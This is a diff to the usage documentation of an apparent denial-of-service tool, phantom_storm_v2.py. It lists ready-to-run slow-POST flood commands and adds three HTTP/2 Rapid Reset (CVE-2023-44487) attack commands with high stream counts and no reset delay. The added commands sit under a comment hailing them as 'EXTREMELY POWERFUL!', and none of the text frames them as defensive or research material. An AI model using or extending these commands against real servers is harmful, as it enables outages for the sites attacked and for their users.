@@ -200,6 +200,11 @@ python phantom_storm_v2.py 192.168.1.100 80 100 --attack-type=slow-post
 python phantom_storm_v2.py 192.168.1.100 80 100 --attack-type=slow-post --content-length=500000 --post-delay=5.0
 python phantom_storm_v2.py 192.168.1.100 443 100 --attack-type=slow-post --https
 
+# HTTP/2 Rapid Reset (CVE-2023-44487) - EXTREMELY POWERFUL! 🔥
+python phantom_storm_v2.py 192.168.1.100 443 50 --attack-type=http2-rapid-reset
+python phantom_storm_v2.py 192.168.1.100 443 100 --attack-type=http2-rapid-reset --h2-streams=2000
+python phantom_storm_v2.py 192.168.1.100 443 200 --attack-type=http2-rapid-reset --h2-streams=5000 --h2-reset-delay=0.0
+
 # Using legacy version
 python phantom_storm.py 192.168.1.100 80 200
 ```
